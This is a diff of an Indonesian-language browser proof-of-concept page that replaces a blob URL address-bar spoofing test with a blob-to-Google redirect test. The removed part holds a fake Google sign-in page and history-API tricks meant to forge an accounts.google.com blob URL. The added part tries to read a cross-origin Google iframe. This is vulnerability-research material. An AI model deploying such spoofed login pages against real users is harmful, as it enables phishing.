@@ -3,40 +3,45 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blob URL UI Spoofing PoC</title>
+<title>Blob URL Direct Redirect to Google</title>
 <style>
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 30px; margin: 0; }
-  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; }
-  .panel { background: #16213e; padding: 25px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #0f3460; }
-  button { padding: 14px 28px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 15px; font-weight: bold; margin: 5px; transition: background 0.2s; }
-  button:hover { background: #c73650; }
-  #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 12px; border: 1px solid #0f3460; }
+  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+  .panel { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+  button { padding: 12px 24px; background: #0e639c; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 14px; }
+  button:hover { background: #1177bb; }
+  #log { background: #000; padding: 15px; border-radius: 6px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #333; }
   .success { color: #4caf50; font-weight: bold; }
-  .error { color: #f44336; font-weight: bold; }
+  .error { color: #f44336; }
   .info { color: #2196f3; }
-  .warn { color: #ff9800; font-weight: bold; }
+  .warn { color: #ff9800; }
+  iframe { width: 100%; height: 300px; border: 2px solid #555; margin-top: 20px; border-radius: 6px; background: #fff; }
 </style>
 </head>
 <body>
 
-<h1>🕵️ Blob URL UI Spoofing PoC</h1>
+<h1>🔀 Blob URL → Google Direct Redirect</h1>
 
 <div class="panel">
   <p style="color:#aaa; margin-top:0;">
-    Klik tombol di bawah untuk membuka halaman login Google palsu di tab baru. Perhatikan address bar pada tab tersebut.
+    Klik tombol untuk membuka Blob URL yang berisi redirect ke Google. Perhatikan address bar dan console.
   </p>
-  <button id="btnSpoof">🎭 Buka Halaman Palsu</button>
-  <button id="btnCheck">🔍 Cek Address Bar Saat Ini</button>
+  <button id="btnLocation">1. Redirect via location.href</button>
+  <button id="btnReplace">2. Redirect via location.replace</button>
+  <button id="btnMeta">3. Redirect via meta refresh</button>
+  <button id="btnForm">4. Redirect via form submission</button>
+  <button id="btnIframe">5. Load Google via iframe (Blob wrapper)</button>
   <button id="clear" style="background:#555;">Bersihkan Log</button>
 </div>
 
 <div id="log">Menunggu perintah...</div>
+<div id="frameContainer"></div>
 
 <script>
 (function() {
   'use strict';
 
   const logEl = document.getElementById('log');
+  const frameContainer = document.getElementById('frameContainer');
 
   function log(msg, type = '') {
     const time = new Date().toISOString().substr(11, 8);
@@ -49,140 +54,136 @@
     console.log(msg);
   }
 
-  // ============================================
-  // KONTEN HALAMAN PALSU (Google Login)
-  // ============================================
-  const fakeGoogleLogin = `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Sign in - Google Accounts</title>
-      <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-          font-family: 'Google Sans', Roboto, Arial, sans-serif;
-          background: #f0f4f9;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          min-height: 100vh;
-        }
-        .login-card {
-          background: #fff;
-          padding: 48px 40px 36px;
-          border-radius: 8px;
-          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-          width: 100%;
-          max-width: 450px;
-          text-align: center;
-        }
-        .google-logo {
-          font-size: 24px;
-          font-weight: 500;
-          color: #202124;
-          margin-bottom: 8px;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          gap: 8px;
-        }
-        .g-icon {
-          width: 32px;
-          height: 32px;
-          background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>') no-repeat center;
-          background-size: contain;
-        }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-        p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
-        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; outline: none; }
-        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-        .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
-        .btn-create { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; background: none; border: none; padding: 8px; }
-        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .btn-next:hover { background: #1765cc; }
-        .footer { margin-top: 40px; font-size: 12px; color: #5f6368; }
-      </style>
-    </head>
-    <body>
-      <div class="login-card">
-        <div class="google-logo"><div class="g-icon"></div><span>Sign in with Google</span></div>
-        <h1>Sign in</h1>
-        <p class="subtitle">to continue to Gmail</p>
-        <input type="email" placeholder="Email or phone" autofocus />
-        <div class="btn-row">
-          <button class="btn-create">Create account</button>
-          <button class="btn-next">Next</button>
-        </div>
-        <div class="footer">This is a UI Spoofing PoC — not a real Google page.</div>
-      </div>
-      <script>
-        (function() {
-          var fakeBlob = 'blob:https://accounts.google.com/1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d';
-          try { history.replaceState({ spoof: true }, 'Sign in - Google Accounts', fakeBlob); window.parent.postMessage({ status: 'replaceState_success', url: fakeBlob }, '*'); }
-          catch (e) { window.parent.postMessage({ status: 'replaceState_fail', error: e.name + ': ' + e.message }, '*'); }
-          try { history.pushState({ spoof: true }, 'Sign in - Google Accounts', fakeBlob); window.parent.postMessage({ status: 'pushState_success', url: fakeBlob }, '*'); }
-          catch (e) { window.parent.postMessage({ status: 'pushState_fail', error: e.name + ': ' + e.message }, '*'); }
-          try { document.domain = 'google.com'; window.parent.postMessage({ status: 'domain_success' }, '*'); }
-          catch (e) { window.parent.postMessage({ status: 'domain_fail', error: e.message }, '*'); }
-          setTimeout(function() { window.parent.postMessage({ status: 'final', href: window.location.href, origin: window.location.origin }, '*'); }, 500);
-        })();
-      <\/script>
-    </body>
-    </html>
-  `;
+  function clearAll() {
+    logEl.textContent = '';
+    frameContainer.innerHTML = '';
+  }
 
   // ============================================
-  // BUKA HALAMAN PALSU
+  // KONTEN BLOB YANG AKAN REDIRECT
   // ============================================
-  document.getElementById('btnSpoof').onclick = () => {
-    log('=== MEMBUKA HALAMAN PALSU (BLOB UI SPOOFING) ===', 'info');
-    const blob = new Blob([fakeGoogleLogin], { type: 'text/html' });
+  function buildRedirectBlob(method) {
+    let redirectCode = '';
+    const targetUrl = 'https://accounts.google.com';
+
+    switch (method) {
+      case 'location':
+        redirectCode = `<script>window.location.href = '${targetUrl}';<\/script>`;
+        break;
+      case 'replace':
+        redirectCode = `<script>window.location.replace('${targetUrl}');<\/script>`;
+        break;
+      case 'meta':
+        redirectCode = `<meta http-equiv="refresh" content="0;url=${targetUrl}">`;
+        break;
+      case 'form':
+        redirectCode = `
+          <form id="f" action="${targetUrl}" method="GET">
+            <input type="hidden" name="redirect" value="true">
+          </form>
+          <script>document.getElementById('f').submit();<\/script>
+        `;
+        break;
+      case 'iframe':
+        // Iframe wrapper: Blob berisi iframe yang memuat Google
+        redirectCode = `
+          <iframe src="${targetUrl}" style="width:100%;height:100vh;border:none;"></iframe>
+          <script>
+            // Coba akses iframe setelah load
+            window.onload = function() {
+              setTimeout(function() {
+                try {
+                  var iframe = document.querySelector('iframe');
+                  var doc = iframe.contentDocument;
+                  if (doc) {
+                    window.parent.postMessage({ status: 'iframe_access_success', title: doc.title }, '*');
+                  } else {
+                    window.parent.postMessage({ status: 'iframe_access_null' }, '*');
+                  }
+                } catch (e) {
+                  window.parent.postMessage({ status: 'iframe_access_fail', error: e.name + ': ' + e.message }, '*');
+                }
+              }, 2000);
+            };
+          <\/script>
+        `;
+        break;
+    }
+
+    return `<!DOCTYPE html>
+      <html>
+      <head><meta charset="UTF-8"><title>Redirecting...</title></head>
+      <body style="background:#fff;font-family:Arial;text-align:center;padding-top:50px;">
+        <h2>Redirecting to Google...</h2>
+        <p style="color:#666;">Method: ${method}</p>
+        ${redirectCode}
+      </body>
+      </html>`;
+  }
+
+  // ============================================
+  // FUNGSI UTAMA: BUKA BLOB DAN REDIRECT
+  // ============================================
+  function openBlobRedirect(method) {
+    log(`=== METODE: ${method.toUpperCase()} ===`, 'info');
+    clearAll();
+
+    const html = buildRedirectBlob(method);
+    const blob = new Blob([html], { type: 'text/html' });
     const url = URL.createObjectURL(blob);
-    log('Blob URL: ' + url, 'info');
+
+    log('Blob URL dibuat: ' + url, 'info');
+    log('Membuka tab baru...', 'info');
+
     const win = window.open(url, '_blank');
+
     if (!win) {
       log('❌ Popup diblokir. Izinkan popup untuk melanjutkan.', 'error');
       return;
     }
-    log('✅ Tab baru terbuka. Perhatikan ADDRESS BAR di tab tersebut:', 'success');
-    log('   • blob:https://artha231.github.io/... → AMAN (expected)', 'warn');
-    log('   • blob:https://accounts.google.com/... → BUG (UI Spoofing!)', 'success');
 
+    log('✅ Tab baru terbuka. Perhatikan address bar:', 'success');
+    log('   • Jika berubah ke https://accounts.google.com → redirect berhasil (expected)', 'warn');
+    log('   • Jika tetap blob:... → redirect gagal (mungkin bug)', 'info');
+
+    // Listener untuk pesan dari tab baru (untuk metode iframe)
     window.addEventListener('message', (e) => {
-      if (!e.data || !e.data.status) return;
-      switch (e.data.status) {
-        case 'replaceState_success': log('🎯 replaceState BERHASIL ke: ' + e.data.url, 'success'); break;
-        case 'replaceState_fail': log('❌ replaceState gagal: ' + e.data.error, 'error'); break;
-        case 'pushState_success': log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success'); break;
-        case 'pushState_fail': log('❌ pushState gagal: ' + e.data.error, 'error'); break;
-        case 'domain_success': log('🎯 document.domain berhasil diubah!', 'success'); break;
-        case 'domain_fail': log('❌ document.domain gagal: ' + e.data.error, 'error'); break;
-        case 'final': log('📋 Final href: ' + e.data.href, 'info'); log('📋 Final origin: ' + e.data.origin, 'info'); break;
+      if (e.data && e.data.status) {
+        if (e.data.status === 'iframe_access_success') {
+          log('🎯 BUG: Bisa akses iframe Google dari Blob! Title: ' + e.data.title, 'success');
+        } else if (e.data.status === 'iframe_access_fail') {
+          log('❌ Iframe Google diblokir SOP: ' + e.data.error, 'error');
+        } else if (e.data.status === 'iframe_access_null') {
+          log('❌ Iframe contentDocument null (cross-origin).', 'error');
+        }
       }
-    });
+    }, { once: false });
 
+    // Cleanup
     setTimeout(() => URL.revokeObjectURL(url), 60000);
-  };
+  }
 
   // ============================================
-  // CEK ADDRESS BAR
+  // TOMBOL HANDLERS
   // ============================================
-  document.getElementById('btnCheck').onclick = () => {
-    log('=== CEK ADDRESS BAR ===', 'info');
-    log('href: ' + window.location.href, 'info');
-    log('origin: ' + window.location.origin, 'info');
-    log('document.domain: ' + document.domain, 'info');
-    log('history.length: ' + history.length, 'info');
-  };
+  document.getElementById('btnLocation').onclick = () => openBlobRedirect('location');
+  document.getElementById('btnReplace').onclick = () => openBlobRedirect('replace');
+  document.getElementById('btnMeta').onclick = () => openBlobRedirect('meta');
+  document.getElementById('btnForm').onclick = () => openBlobRedirect('form');
+  document.getElementById('btnIframe').onclick = () => openBlobRedirect('iframe');
 
   document.getElementById('clear').onclick = () => {
-    logEl.textContent = '';
+    clearAll();
     log('Log dibersihkan.', 'info');
   };
 
-  log('PoC siap. Klik "Buka Halaman Palsu" untuk memulai.', 'info');
+  // ============================================
+  // INIT
+  // ============================================
+  log('PoC Blob Direct Redirect siap.', 'info');
+  log('Pilih metode di atas untuk menguji redirect ke Google.', 'info');
+  log('⚠️ Semua metode akan me-redirect ke Google, tapi address bar akan berubah ke https://accounts.google.com (expected).', 'warn');
+
 })();
 </script>
 </body>
